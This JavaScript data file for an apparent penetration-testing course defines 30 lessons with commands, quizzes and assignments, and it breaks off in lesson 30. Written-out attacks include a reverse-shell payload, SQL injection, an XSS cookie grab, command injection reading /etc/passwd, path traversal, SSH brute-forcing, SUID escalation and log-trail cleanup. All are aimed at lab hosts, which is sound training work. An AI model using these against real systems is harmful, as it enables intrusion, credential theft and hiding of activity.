/* ================================================================
   NIGHTERS CYBER ACADEMY — lessons-data.js (Complete 30 Levels Matrix)
   ================================================================ */

const LESSONS = [
  // ── PHASE 1: FOUNDATION (MONTH 1) ───────────────────────────────
  {
    id: 1, title: "Setting Up Your Arsenal", emoji: "📱", subtitle: "Install Termux and Debian. Get ready for everything.", type: "system", phase: 1, month: 1, points: 50, duration_mins: 60,
    intro: "Before launching attacks, your local environment must be locked down and loaded. This tier configures your command layer using an isolated Unix terminal wrapper.",
    sections: [
      {
        title: "Install Termux Ecosystem",
        steps: ["Download and compile the F-Droid app application layer.", "Search for the standalone Termux application frame.", "Initialize environment and query filesystem permissions parameters."],
        cmd: [{ t: "c", v: "Update primary package indices" }, { t: "cmd", v: "pkg update && pkg upgrade -y" }, { t: "ok", v: "Packages successfully upgraded." }]
      }
    ],
    hints: ["Avoid downloading components via the standard Google Play Store to maintain proper path dependencies."],
    quiz: [{ q: "Which engine source package stream is supported for architecture provisioning?", opts: ["Play Store Core", "F-Droid Mirror Hub", "Direct ZIP extraction", "Cloud Emulation API"], a: 1 }],
    assignment: { title: "Environment Verification", tasks: ["Provision shell pipeline terminal instance.", "Verify execution loops inside sandbox."], submit: "Provide screenshot confirmation of clean core upgrade execution output logs." }
  },
  {
    id: 2, title: "Linux Shell Navigation Basics", emoji: "📁", subtitle: "Mastering standard pipeline directory commands.", type: "system", phase: 1, month: 1, points: 50, duration_mins: 45,
    intro: "Operating inside target architectures requires fluid familiarity with non-GUI environments.",
    sections: [
      {
        title: "Traversal Commands Matrix",
        steps: ["Print active workspace path parameters.", "List directory descriptors and systemic file masks."],
        cmd: [{ t: "cmd", v: "pwd && ls -la" }, { t: "out", v: "drwxr-xr-x  2 operative root 4096" }]
      }
    ],
    hints: ["Use explicit file access attribute flags to locate structural dotfiles."],
    quiz: [{ q: "Which operator outputs the active operational absolute path?", opts: ["dir", "path -show", "pwd", "whereami"], a: 2 }],
    assignment: { title: "Filesystem Exploration", tasks: ["Map target user path strings.", "Locate configuration artifacts."], submit: "Submit absolute string paths matching localized system variables." }
  },
  {
    id: 3, title: "File Operations & Data Streams", emoji: "📝", subtitle: "Creating, copying, moving, and viewing raw buffers.", type: "system", phase: 1, month: 1, points: 50, duration_mins: 40,
    intro: "Interrogating parameters and building attack modules requires file stream modification pipelines.",
    sections: [
      {
        title: "Stream Editors & Buffers",
        steps: ["Initialize text vector via command line standard input.", "Concatenate file configurations to standard console outputs."],
        cmd: [{ t: "cmd", v: "echo 'TARGET_ACTIVE' > scope.txt && cat scope.txt" }, { t: "out", v: "TARGET_ACTIVE" }]
      }
    ],
    hints: ["Double bracket operators append payloads; single brackets overwrite existing file boundaries."],
    quiz: [{ q: "Which string operator handles non-destructive array logging append operations?", opts: [">", ">>", "<|", "&="], a: 1 }],
    assignment: { title: "Payload Assembly Lab", tasks: ["Generate payload manifests.", "Merge independent code assets into unified scripts."], submit: "Provide structural logs mapping content array streams." }
  },
  {
    id: 4, title: "Permissions & Ownership Layers", emoji: "🔑", subtitle: "Breaking boundaries with chmod and chown structures.", type: "system", phase: 1, month: 1, points: 60, duration_mins: 50,
    intro: "Understanding file system privileges allows attackers to find logic flaws and modify scripts safely.",
    sections: [
      {
        title: "Privilege Attribute Modification",
        steps: ["Grant full read, write, and execute permissions to a custom utility.", "Inspect updated system permission bitmasks."],
        cmd: [{ t: "cmd", v: "chmod +x exploit.sh && ls -l exploit.sh" }, { t: "out", v: "-rwxr-xr-x 1 operative" }]
      }
    ],
    hints: ["Hex/Octal notation maps bits explicitly (755 corresponds to standard owner execution parameters)."],
    quiz: [{ q: "What string state does the octal value '777' describe?", opts: ["Root execution exception filter", "Global read-only restriction", "Full universal read, write, and execute permissions", "Encrypted structural boundary block"], a: 2 }],
    assignment: { title: "Access Elevation Matrix", tasks: ["Configure non-executable target scripts.", "Verify functional binary execution loops."], submit: "Upload logs showing binary files safely running in the terminal workspace." }
  },
  {
    id: 5, title: "Process Execution Control", emoji: "⚙️", subtitle: "Managing background payloads and worker processes.", type: "system", phase: 1, month: 1, points: 60, duration_mins: 45,
    intro: "Long-running collection loops and reverse access shells must be pushed into background operational processes.",
    sections: [
      {
        title: "Background Process Orchestration",
        steps: ["Launch listener jobs using background operators.", "List operational thread indicators currently running in the active workspace."],
        cmd: [{ t: "cmd", v: "sleep 100 & jobs" }, { t: "out", v: "[1]+ Running sleep 100 &" }]
      }
    ],
    hints: ["Appending an ampersand tells the interface to fork process execution immediately into a background worker thread."],
    quiz: [{ q: "Which utility sends system termination flags directly to active process identifiers?", opts: ["stop", "kill", "halt", "drop"], a: 1 }],
    assignment: { title: "Process Lifecycle Lab", tasks: ["Launch multiple mock monitor services.", "Locate and isolate thread process IDs to terminate them."], submit: "Log process ID tables matching targeted script filters." }
  },
  {
    id: 6, title: "Advanced Package Management", emoji: "📦", subtitle: "Compiling attack components from software repositories.", type: "system", phase: 1, month: 1, points: 70, duration_mins: 55,
    intro: "Custom utilities require accurate source installation channels and dependencies across system profiles.",
    sections: [
      {
        title: "Repository Source Validation",
        steps: ["Synchronize remote asset endpoints.", "Install compilation helper tool sets directly via terminal layers."],
        cmd: [{ t: "cmd", v: "apt update && apt install git make -y" }, { t: "ok", v: "Build essentials initialized." }]
      }
    ],
    hints: ["Missing build parameters often prevent framework binaries from compiling successfully on custom devices."],
    quiz: [{ q: "Which toolkit interface serves as the standard package manager for Debian systems?", opts: ["rpm", "pacman", "apt", "yum"], a: 2 }],
    assignment: { title: "Tooling Deployment Validation", tasks: ["Source core build dependencies from public code repositories.", "Verify tool syntax structures."], submit: "Verify successful installations by querying your version parameters via the terminal." }
  },
  {
    id: 7, title: "Text Extraction & Stream Filters", emoji: "🔍", subtitle: "Parsing access logs using grep and regular expressions.", type: "system", phase: 1, month: 1, points: 70, duration_mins: 60,
    intro: "Isolating database tables, administrative paths, or leak tokens requires deep data log parsing pipelines.",
    sections: [
      {
        title: "Regular Expression Identification",
        steps: ["Isolate target communication events from plain text strings.", "Count occurrences matching structural profile anomalies."],
        cmd: [{ t: "cmd", v: "grep -i 'password' auth.log" }, { t: "out", v: "Jan 26 12:00:01 admin accepted password" }]
      }
    ],
    hints: ["Combine regular pipes with filtration modules to build automated threat alerts."],
    quiz: [{ q: "Which core utility extracts explicit structural search profiles using pattern matching?", opts: ["find", "grep", "locate", "cat"], a: 1 }],
    assignment: { title: "Log Analysis Drill", tasks: ["Parse a simulated server logs dataset.", "Isolate user access exceptions and token anomalies."], submit: "Provide string counts matching compromised user identity parameters." }
  },
  {
    id: 8, title: "Network State Enumeration", emoji: "🌐", subtitle: "Inspecting open sockets, device connections, and routing paths.", type: "system", phase: 1, month: 1, points: 80, duration_mins: 60,
    intro: "Identifying local listening vectors helps confirm where databases and open ports are waiting for connections.",
    sections: [
      {
        title: "Active Port Mapping",
        steps: ["Examine operational TCP routing interfaces.", "Isolate service configurations bind values."],
        cmd: [{ t: "cmd", v: "ss -tulpn" }, { t: "out", v: "Netid State Recv-Q Send-Q Local Address:Port" }]
      }
    ],
    hints: ["Privileged port fields below index 1024 require administrative security permissions to establish loops."],
    quiz: [{ q: "Which utility maps network routing states, active interface bindings, and connection sockets?", opts: ["ping", "ss", "ifconfig", "traceroute"], a: 1 }],
    assignment: { title: "Interface Architecture Scan", tasks: ["Map open service configurations on your local device.", "Identify local web server listening vectors."], submit: "Submit the loopback port values discovered during your local network state scan." }
  },
  {
    id: 9, title: "OSINT Target Profiling Tools", emoji: "📡", subtitle: "Scouting targets using automated data collection scripts.", type: "system", phase: 1, month: 1, points: 80, duration_mins: 90,
    intro: "Open Source Intelligence helps you map asset surfaces, email schemas, and server setups before launching direct scans.",
    sections: [
      {
        title: "Asset Harvesting Pipelines",
        steps: ["Deploy reconnaissance tools against authorized playground assets.", "Export profile maps to log files."],
        cmd: [{ t: "cmd", v: "theHarvester -d sandbox.nighters.lan -l 500 -b baidu" }, { t: "out", v: "[*] Targets discovered: 3 subdomains" }]
      }
    ],
    hints: ["Passive reconnaissance loops do not interact directly with target hosting firewalls."],
    quiz: [{ q: "What defines an informative 'Passive Reconnaissance' footprint loop?", opts: ["Direct fuzzing of endpoint nodes", "Extracting publicly indexed records without hitting host servers", "Launching buffer exploits", "Modifying user passwords"], a: 1 }],
    assignment: { title: "Passive Exposure Report", tasks: ["Gather exposed identity logs for simulated testing domains.", "Map public subdomain profiles."], submit: "Document discovered external domain maps and structural endpoints safely." }
  },
  {
    id: 10, title: "Bash Automation Frameworks", emoji: "🤖", subtitle: "Writing automated server checking scripts.", type: "system", phase: 1, month: 1, points: 100, duration_mins: 120,
    intro: "Automated scripting handles the boring stuff, letting you chain complex terminal commands into rapid, single-click attack tools.",
    sections: [
      {
        title: "Automation Shell Scripts",
        steps: ["Write conditional check loops to test target state changes.", "Make the tool executable and test its logic loops."],
        cmd: [{ t: "cmd", v: "echo -e '#!/bin/bash\nif [ 1 -eq 1 ]; then echo \"ONLINE\"; fi' > ping.sh && bash ping.sh" }, { t: "out", v: "ONLINE" }]
      }
    ],
    hints: ["Always include a proper hashbang expression on line one to tell the terminal which shell interpreter to load."],
    quiz: [{ q: "What is the standard bash path instruction used inside standard automation hashbangs?", opts: ["#!/bin/bash", "#/run/bash", "//@use-bash", "import bash"], a: 0 }],
    assignment: { title: "Recon Automation Lab", tasks: ["Write an automated port tester script.", "Build log file exports directly into your tool logic."], submit: "Submit the complete automation code block for administrative review." }
  },

  // ── PHASE 2: RECON & EXPLOIT MATRIX (MONTH 2) ──────────────────
  {
    id: 11, title: "Active Target Scanning (Nmap)", emoji: "🎯", subtitle: "Discovering service names and versions behind open ports.", type: "web", phase: 2, month: 2, points: 100, duration_mins: 60,
    intro: "Active scanning maps structural system profiles, telling you exactly which service versions are running behind open network ports.",
    sections: [
      {
        title: "Service Signature Scans",
        steps: ["Run a comprehensive version scan against an authorized playground machine.", "Analyze open port configurations and OS signatures."],
        cmd: [{ t: "cmd", v: "nmap -sV -Pn 10.10.12.45" }, { t: "out", v: "PORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.41" }]
      }
    ],
    hints: ["Using the `-Pn` switch bypasses host discovery filters by treating the target as permanently active."],
    quiz: [{ q: "Which Nmap parameter flag requests explicit service version configuration profiling?", opts: ["-sS", "-O", "-sV", "-A"], a: 2 }],
    assignment: { title: "Network Architecture Discovery", tasks: ["Scan target IP nodes to map active network ports.", "Document any discovered server application engines."], submit: "Submit the exact service configuration versions found on the target host." }
  },
  {
    id: 12, title: "Web Architecture Inspection", emoji: "🌐", subtitle: "Analyzing response frames and security cookies.", type: "web", phase: 2, month: 2, points: 100, duration_mins: 60,
    intro: "Checking application tech stacks gives you a blueprint of the framework versions, headers, and load structures in play.",
    sections: [
      {
        title: "Header Parameter Inspections",
        steps: ["Query target response logs using raw endpoint tests.", "Check cookie security attributes like HttpOnly and Secure flags."],
        cmd: [{ t: "cmd", v: "curl -I https://sandbox.nighters.lan" }, { t: "out", v: "HTTP/1.1 200 OK\nX-Powered-By: PHP/7.4.3" }]
      }
    ],
    hints: ["Exposed server headers can reveal exact patch version numbers, giving attackers a hint on what exploits might work."],
    quiz: [{ q: "Which flag forces curl to pull down header responses instead of body content arrays?", opts: ["-X POST", "-I", "-d", "--raw"], a: 1 }],
    assignment: { title: "Header Exposure Analysis", tasks: ["Extract header payloads from mock laboratory web views.", "Check for missing platform defense configuration rules."], submit: "List all custom or unhardened platform version strings found in the response." }
  },
  {
    id: 13, title: "Directory Invalidation (Fuzzing)", emoji: "📂", subtitle: "Brute-forcing hidden routes and backup directories.", type: "web", phase: 2, month: 2, points: 120, duration_mins: 75,
    intro: "Directory busting hammers web endpoints with wordlists to uncover forgotten folders, source files, and setup backups.",
    sections: [
      {
        title: "Endpoint Path Discovery",
        steps: ["Run a directory path scan using dedicated discovery wordlists.", "Filter out noisy server response messages like 404 pages."],
        cmd: [{ t: "cmd", v: "gobuster dir -u http://10.10.12.45 -w /usr/share/wordlists/dirb/common.txt" }, { t: "out", v: "Found: /backup.zip (Status: 200)" }]
      }
    ],
    hints: ["Pay close attention to size status returns; a sudden size shift can mean you found an access bypass rule."],
    quiz: [{ q: "What web response status code shows that an endpoint route requires authentication?", opts: ["200 OK", "301 Redirect", "401 Unauthorized", "404 Not Found"], a: 2 }],
    assignment: { title: "Hidden Path Lab", tasks: ["Fuzz the challenge web machine routes.", "Locate hidden administration assets or code backups."], submit: "Provide the secret URL string path discovered via your brute-force scan." }
  },
  {
    id: 14, title: "Subdomain Enumeration Systems", emoji: "🔀", subtitle: "Discovering development portals and staging sites.", type: "web", phase: 2, month: 2, points: 120, duration_mins: 80,
    intro: "Companies often leave staging platforms and internal testing domains exposed right alongside their main web pages.",
    sections: [
      {
        title: "Virtual Host Discoveries",
        steps: ["Scan root domains using virtual host brute-forcing setups.", "Track unexpected server redirection responses."],
        cmd: [{ t: "cmd", v: "wfuzz -c -w subdomains.txt -u http://nighters.lan -H 'Host: FUZZ.nighters.lan'" }, { t: "out", v: "000023:  C=200      32 L      148 W       1205 Ch        'dev'" }]
      }
    ],
    hints: ["Filtering out standard line numbers or word lengths helps clear away noisy false positives from wildcard domains."],
    quiz: [{ q: "Why do red teamers explicitly target dev/staging subdomains?", opts: ["They use stronger encryption keys", "They often lack security monitoring and run unpatched testing code", "They are hosted offline", "They contain no user accounts"], a: 1 }],
    assignment: { title: "Subdomain Exposure Mapping", tasks: ["Map out the hidden subdomain infrastructure of our lab playground.", "Isolate development servers."], submit: "Submit the valid subdomain addresses you managed to uncover during the scan." }
  },
  {
    id: 15, title: "Vulnerability Database Mapping", emoji: "🗄️", subtitle: "Matching version maps against public exploits.", type: "web", phase: 2, month: 2, points: 130, duration_mins: 90,
    intro: "Once you map service versions, cross-reference them with public databases to see if working exploits are already documented.",
    sections: [
      {
        title: "Exploit Search Engines",
        steps: ["Search local vulnerability databases for known exploit scripts.", "Check exploit code logs for patch matching accuracy."],
        cmd: [{ t: "cmd", v: "searchsploit apache 2.4.41" }, { t: "out", v: "Apache 2.4.41 - Multiple Vulnerabilities" }]
      }
    ],
    hints: ["Always carefully inspect exploit source code structures before running it to ensure it functions as intended."],
    quiz: [{ q: "What does the industry standard term 'CVE' stand for?", opts: ["Common Vulnerabilities and Exposures", "Core Vendor Encryption", "Critical Vector Evaluation", "Central Verification Engine"], a: 0 }],
    assignment: { title: "Vulnerability Verification", tasks: ["Identify working exploit modules for the unpatched software in our lab.", "Extract their CVE tracking reference numbers."], submit: "Submit the CVE ID matching the unpatched software layer." }
  },
  {
    id: 16, title: "Exploitation Basics (Metasploit)", emoji: "💥", subtitle: "Configuring listeners and managing reverse shells.", type: "system", phase: 2, month: 2, points: 150, duration_mins: 100,
    intro: "Learn how to weaponize known system bugs by configuring exploit payloads, setting listeners, and establishing your first remote shell access.",
    sections: [
      {
        title: "Framework Console Configs",
        steps: ["Launch the core exploitation platform module.", "Select the target exploit module and configure your callback listeners."],
        cmd: [{ t: "cmd", v: "msfconsole -q\nuse exploit/multi/handler\nset LHOST 10.10.14.5" }, { t: "out", v: "msf exploit(multi/handler) >" }]
      }
    ],
    hints: ["Double-check that your LHOST parameter is set to your actual network adapter interface address, or your payloads won't call back."],
    quiz: [{ q: "What is the core difference between a standard bind shell and a reverse shell connection?", opts: ["Bind shells encrypt all data streams automatically", "Reverse shells force the target system to dial out to your listener platform, bypassing inbound firewall rules", "Bind shells require no network ports", "Reverse shells only run on Windows targets"], a: 1 }],
    assignment: { title: "Callback Listener Setup", tasks: ["Configure an multi-handler listener node inside the lab setup.", "Prepare a reverse callback session profile."], submit: "Log your configured listener variables and parameters for review." }
  },
  {
    id: 17, title: "Payload Generation Techniques", emoji: "💾", subtitle: "Compiling stand-alone binaries and reverse access scripts.", type: "system", phase: 2, month: 2, points: 150, duration_mins: 110,
    intro: "Generate weaponized single-click execution files and script extensions tailored to your target machine's architecture.",
    sections: [
      {
        title: "Binary Payload Generation",
        steps: ["Generate an executable cross-platform shell connection script payload.", "Deploy listener nodes to catch the inbound terminal traffic."],
        cmd: [{ t: "cmd", v: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf > session.elf" }, { t: "out", v: "Payload size: 249 bytes saved to session.elf" }]
      }
    ],
    hints: ["Payload size properties alter how easily a piece of code slips through strict application buffer limits."],
    quiz: [{ q: "Which tool handles automated payload building and format compilation within Metasploit environments?", opts: ["msfconsole", "msfvenom", "msfdb", "meterpreter"], a: 1 }],
    assignment: { title: "Cross-Architecture Compiles", tasks: ["Build a working executable connection script payload for our lab machine.", "Confirm the file runs smoothly inside the sandbox."], submit: "Upload the specific parameter settings used during generation." }
  },
  {
    id: 18, title: "Interactive Session Upgrades", emoji: "🐚", subtitle: "Upgrading limited reverse shells into stable system dashboards.", type: "system", phase: 2, month: 2, points: 160, duration_mins: 90,
    intro: "Basic reverse shells are brittle and break easily. Learn how to upgrade them into full, interactive terminal environments with tab completion and proper text scaling.",
    sections: [
      {
        title: "TTY Shell Provisioning",
        steps: ["Break out of raw script setups using an inline runtime command trick.", "Background your active workspace to fix local terminal parameters."],
        cmd: [{ t: "cmd", v: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" }, { t: "out", v: "operative@target:/$" }]
      }
    ],
    hints: ["Use `stty raw -echo` on your machine to let terminal controls like Ctrl+C pass directly to the remote system without killing your session."],
    quiz: [{ q: "Why are raw terminal connections upgraded to fully interactive TTY environments?", opts: ["To turn on full terminal path history and run programs like text editors or password prompts", "To bypass file encryption locks", "To automatically gain root access", "To run network port scans from the host"], a: 0 }],
    assignment: { title: "Terminal Stability Matrix", tasks: ["Catch a limited connection script callback inside the sandbox.", "Upgrade it to a stable TTY environment."], submit: "Submit the series of commands used to upgrade your shell to a stable state." }
  },
  {
    id: 19, title: "Target Database Extraction", emoji: "🗄️", subtitle: "Interrogating relational engines and reading database files.", type: "web", phase: 2, month: 2, points: 180, duration_mins: 120,
    intro: "Learn how to manually query relational databases, search configuration tables, and dump stored user credentials once inside a target server.",
    sections: [
      {
        title: "Relational Query Routines",
        steps: ["Log into a localized back-end data engine using discovered access codes.", "Extract database names, column listings, and application credentials."],
        cmd: [{ t: "cmd", v: "mysql -u operative -p'SEC_DATA_99' -e 'SHOW DATABASES;'" }, { t: "out", v: "Database: core_app_users" }]
      }
    ],
    hints: ["Look for configuration files like `config.php` or `.env` inside web roots; they are goldmines for database passwords."],
    quiz: [{ q: "Which file format is commonly used to cache application database connection secrets?", opts: ["index.html", ".env", "style.css", "robots.txt"], a: 1 }],
    assignment: { title: "Internal Credential Audit", tasks: ["Navigate to the storage paths on the lab target.", "Extract credential records from the operational database tables."], submit: "Submit the administrative login credentials found hidden inside the table files." }
  },
  {
    id: 20, title: "Network Lateral Pivoting", emoji: "⛓️", subtitle: "Routing attack tools through compromised systems into internal networks.", type: "system", phase: 2, month: 2, points: 200, duration_mins: 150,
    intro: "Systems deep within an internal network are often blocked from direct internet access. Learn how to turn a compromised machine into a secure traffic proxy to reach deeper network zones.",
    sections: [
      {
        title: "Proxy Tunneling Setup",
        steps: ["Configure a secure local routing proxy path from your active terminal session.", "Update your system proxy tool maps to route external scanning traffic through that tunnel."],
        cmd: [{ t: "cmd", v: "route add 192.168.5.0/24 1" }, { t: "ok", v: "Routing table adjusted safely." }]
      }
    ],
    hints: ["Using dynamic forwarding options lets you pass all your scanning tools through a single proxy port smoothly."],
    quiz: [{ q: "What is the main goal of setting up a 'Pivoting' route?", opts: ["To crack local user hashes faster", "To use a compromised machine as a proxy jump point to attack hidden internal networks", "To wipe system log trails", "To run website performance tests"], a: 1 }],
    assignment: { title: "Deep Network Tunneling", tasks: ["Establish a secure tunnel through the boundary node in our lab setup.", "Scan and map out the hidden internal network range behind it."], submit: "List the active internal IP nodes uncovered through your pivoting tunnel." }
  },

  // ── PHASE 3: RED TEAM ADVANCED ENCOUNTERS (MONTH 3) ──────────────
  {
    id: 21, title: "SQL Injection Vectors (SQLi)", emoji: "💉", subtitle: "Bypassing login pages and dumping backend databases.", type: "web", phase: 3, month: 3, points: 200, duration_mins: 90,
    intro: "Learn how unescaped user inputs allow attackers to inject raw database queries, bypass login logic, and extract backend information.",
    sections: [
      {
        title: "Input Validation Invalidation",
        steps: ["Inject query breakout codes into unprotected form fields.", "Force database query returns to dump authentication records."],
        cmd: [{ t: "cmd", v: "admin' OR '1'='1" }, { t: "out", v: "Login Successful. Welcome Administrator." }]
      }
    ],
    hints: ["Single quote characters break raw string inputs, forcing the database parser to read your injected logic directly."],
    quiz: [{ q: "What is the root cause of SQL Injection vulnerabilities?", opts: ["Using weak login passwords", "Directly running untrusted user inputs as raw database queries without sanitation", "Leaving network port 80 open", "Misconfigured web design rules"], a: 1 }],
    assignment: { title: "Authentication Bypass Lab", tasks: ["Bypass the input gate on the challenge machine.", "Extract structural profile tables from the target backend."], submit: "Provide the secret flag token exposed by the vulnerable query loop." }
  },
  {
    id: 22, title: "Cross-Site Scripting (XSS)", emoji: "🔮", subtitle: "Injecting malicious scripts into user sessions.", type: "web", phase: 3, month: 3, points: 200, duration_mins: 100,
    intro: "See how failing to sanitize website inputs lets attackers inject malicious JavaScript that executes right inside the browsers of other users.",
    sections: [
      {
        title: "Script Payload Injections",
        steps: ["Inject a script test payload into a vulnerable application comment field.", "Verify execution behavior when the target page loads."],
        cmd: [{ t: "cmd", v: "<script>alert(document.cookie)</script>" }, { t: "out", v: "Pop-up execution box context rendered successfully." }]
      }
    ],
    hints: ["Stored XSS is highly critical because the exploit payload gets saved to the server, hitting every user who visits that page."],
    quiz: [{ q: "Which XSS type saves your malicious payload right onto the database server?", opts: ["Reflected XSS", "Stored XSS", "DOM-Based XSS", "Blind Relay XSS"], a: 1 }],
    assignment: { title: "Session Hijack Simulation", tasks: ["Inject a tracking script into our lab environment's message boards.", "Capture mock user cookie strings dynamically."], submit: "Submit the captured user cookie variables for administrative validation." }
  },
  {
    id: 23, title: "Brute-Force Attack Engine (Hydra)", emoji: "🔨", subtitle: "Automating password attacks against login endpoints.", type: "system", phase: 3, month: 3, points: 220, duration_mins: 90,
    intro: "Learn how to use automated dictionary attacks to test password lists against network protocol services like SSH or FTP.",
    sections: [
      {
        title: "Automated Dictionary Spraying",
        steps: ["Configure a brute-force tool targeting our lab machine's network login protocol.", "Load target username arrays and custom wordlists into the attack engine."],
        cmd: [{ t: "cmd", v: "hydra -l admin -P passwords.txt 10.10.12.45 ssh" }, { t: "out", v: "[22][ssh] host: 10.10.12.45 login: admin password: superoperator" }]
      }
    ],
    hints: ["Running password attacks too fast can lock target accounts or sound alarms on network firewalls."],
    quiz: [{ q: "What type of attack tests long lists of pre-written passwords against a target login page?", opts: ["Phishing Attack", "Dictionary/Brute-Force Attack", "SQL Injection", "Man-in-the-Middle Attack"], a: 1 }],
    assignment: { title: "Network Access Recovery", tasks: ["Run an online brute-force test against the lab target's authentication gate.", "Recover working system access combinations."], submit: "Submit the working login credentials discovered via your attack engine." }
  },
  {
    id: 24, title: "Command Injection Vulnerabilities", emoji: "💻", subtitle: "Forcing target web servers to execute raw operating system commands.", type: "web", phase: 3, month: 3, points: 250, duration_mins: 120,
    intro: "See how poorly designed web scripts that make system calls can be broken into, allowing you to run raw OS terminal commands right through the web browser.",
    sections: [
      {
        title: "OS Command Injection",
        steps: ["Locate a web page that makes internal server-side system engine calls.", "Append chain operators like semicolons or pipes to inject your own OS commands."],
        cmd: [{ t: "cmd", v: "127.0.0.1; cat /etc/passwd" }, { t: "out", v: "root:x:0:0:root:/root:/bin/bash" }]
      }
    ],
    hints: ["Semicolons tell Unix systems to start executing a brand new command string immediately, ignoring whatever came before it."],
    quiz: [{ q: "Which character operates as a standard shell separator to chain multiple commands together?", opts: ["@", "#", ";", "\\"], a: 2 }],
    assignment: { title: "Web Shell Deployment", tasks: ["Exploit a vulnerable inputs element on our laboratory machine.", "Force the host server to reveal its internal environment files."], submit: "Provide the unique user flags hidden within the system files." }
  },
  {
    id: 25, title: "File Inclusion Flaws (LFI/RFI)", emoji: "📂", subtitle: "Reading local configuration logs or running remote payloads.", type: "web", phase: 3, month: 3, points: 250, duration_mins: 110,
    intro: "Learn how weak directory checking lets attackers use directory traversal tricks to read a server's internal files or load remote code.",
    sections: [
      {
        title: "Directory Path Traversal",
        steps: ["Modify URL file path parameters to point directly to deep system configuration maps.", "Use directory escape sequences to jump out of protected folder restrictions."],
        cmd: [{ t: "cmd", v: "curl http://target.lan/page.php?file=../../../../etc/passwd" }, { t: "out", v: "root:x:0:0:root:/root" }]
      }
    ],
    hints: ["Using trailing null bytes or encoding your path characters can sometimes trick old code validation rules into letting your request slip through."],
    quiz: [{ q: "What does the abbreviation 'LFI' explicitly mean in web security testing?", opts: ["Local File Inclusion", "Linear Fault Isolation", "Log File Inspection", "Layered Framework Interface"], a: 0 }],
    assignment: { title: "Traversal Escape Lab", tasks: ["Break out of the standard web root folder limits on the challenge host.", "Extract the sensitive system configuration files."], submit: "Submit the specific string parameters used to pull down the configuration assets." }
  },
  {
    id: 26, title: "Password Hash Cracking Offline", emoji: "🎛️", subtitle: "Using dictionary arrays and rule sets to break stolen hashes offline.", type: "system", phase: 3, month: 3, points: 260, duration_mins: 120,
    intro: "When you dump database records, passwords are usually scrambled as cryptographic hashes. Learn how to crack them offline using smart wordlists and extraction rules.",
    sections: [
      {
        title: "Cryptographic Hash Cracking",
        steps: ["Save target hash values to a local text file.", "Run an offline cracker against the file, mapping the exact encryption type used."],
        cmd: [{ t: "cmd", v: "john --format=raw-md5 hashes.txt" }, { t: "out", v: "Loaded 1 password hash... cracked: operative1" }]
      }
    ],
    hints: ["Adding 'rules' to your password cracking tools automatically modifies wordlist lines with numbers and special symbols, making your attacks much more effective."],
    quiz: [{ q: "Why do security professionals crack password hashes completely offline?", opts: ["It stops the target server from logging login attempts or locking accounts, allowing thousands of speed tests per second", "It needs no processing power", "It cleans up log trails automatically", "It guarantees instant results"], a: 0 }],
    assignment: { title: "Hash Resolution Drill", tasks: ["Identify the encryption scheme on a set of recovered sample hashes.", "Crack the values using your local wordlists."], submit: "Submit the plaintext passwords hidden behind the cryptographic hashes." }
  },
  {
    id: 27, title: "Steganography & Data Forensics", emoji: "🖼️", subtitle: "Extracting hidden operational assets from media attachments.", type: "system", phase: 3, month: 3, points: 280, duration_mins: 130,
    intro: "Red teams use steganography to hide tools inside innocent-looking images or media files, bypassing network file inspections completely.",
    sections: [
      {
        title: "Hidden Asset Extractions",
        steps: ["Inspect file structures for hidden metadata anomalies.", "Extract hidden data buffers using key verification passphrases."],
        cmd: [{ t: "cmd", v: "steghide extract -sf artwork.jpg" }, { t: "out", v: "Wrote extracted data to payload.txt" }]
      }
    ],
    hints: ["Look at file sizes closely; an innocent image containing an entire hidden code file will be noticeably heavier than it should be."],
    quiz: [{ q: "What is the core definition of Steganography?", opts: ["Encrypting a hard drive partition", "Hiding data inside other innocent files, like embedding text inside an image", "Modifying user access rights", "Setting up firewall filters"], a: 1 }],
    assignment: { title: "Exposed Media Extraction", tasks: ["Analyze suspicious media files found on our laboratory server.", "Extract the hidden configuration maps stashed inside them."], submit: "Submit the clear text code hidden inside the media attachment." }
  },
  {
    id: 28, title: "Privilege Elevation (Linux SUID)", emoji: "📈", subtitle: "Exploiting misconfigured file permissions to claim full Root access.", type: "system", phase: 3, month: 3, points: 300, duration_mins: 160,
    intro: "Gaining basic access is just the start. Learn how to spot and exploit misconfigured SUID bits on system files to elevate your privileges all the way to root.",
    sections: [
      {
        title: "SUID Configuration Audits",
        steps: ["Scan the filesystem for binaries running with root permissions.", "Use breakout tricks on these binaries to spawn a root terminal shell."],
        cmd: [{ t: "cmd", v: "find / -perm -4000 -type f 2>/dev/null" }, { t: "out", v: "/usr/bin/python (SUID Active)" }]
      }
    ],
    hints: ["When a binary has SUID permissions active, it runs with the privileges of the file owner (often root) no matter who executes it."],
    quiz: [{ q: "What does an active SUID bit configuration do when a program is executed?", opts: ["It forces the file to open in read-only mode", "It runs the program with the permissions of the file's owner rather than the user who started it", "It immediately deletes the file from the system", "It turns on network encryption layers"], a: 1 }],
    assignment: { title: "Root Level Elevation", tasks: ["Locate permission configuration flaws on the laboratory machine.", "Exploit the SUID files to gain full root system privileges."], submit: "Provide the root user flag token file path to prove execution success." }
  },
  {
    id: 29, title: "Clearing Trails & Log Management", emoji: "🧹", subtitle: "Understanding system logging paths and erasing footprint logs.", type: "system", phase: 3, month: 3, points: 300, duration_mins: 120,
    intro: "A professional red team engagement requires understanding system logs to see how actions are tracked, and ensuring testing trails are cleanly wrapped up.",
    sections: [
      {
        title: "Log Path Interrogations",
        steps: ["Navigate to the core system log folders.", "Inspect active authentication journals and server traffic histories."],
        cmd: [{ t: "cmd", v: "tail -n 5 /var/log/auth.log" }, { t: "out", v: "Session opened for user root by operative" }]
      }
    ],
    hints: ["Completely wiping log files looks highly suspicious. Real professionals carefully remove only their specific testing lines to avoid breaking system monitoring."],
    quiz: [{ q: "Where does Debian store its main system authentication log records?", opts: ["/etc/auth.conf", "/var/log/auth.log", "/opt/secure/logs", "/root/history.txt"], a: 1 }],
    assignment: { title: "Audit Trail Cleanup Simulation", tasks: ["Locate your connection footprints inside the laboratory log assets.", "Cleanly extract your testing trails from the operational file paths."], submit: "Submit the file paths where your session histories were tracked." }
  },
  {
    id: 30, title: "Final Capstone Penetration Report", emoji: "🏁", subtitle: "Documenting findings and drafting mitigation strategies.", type: "web", phase: 3, month: 3, points: 500, duration_mins: 240,
    intro: "Hacking is useless without communication. Wrap up your training by writing a clean, professional pentest report detailing your findings, scores, and how to fix the bugs.",
    sections: [
      {
        title: "Professional Report Drafting",
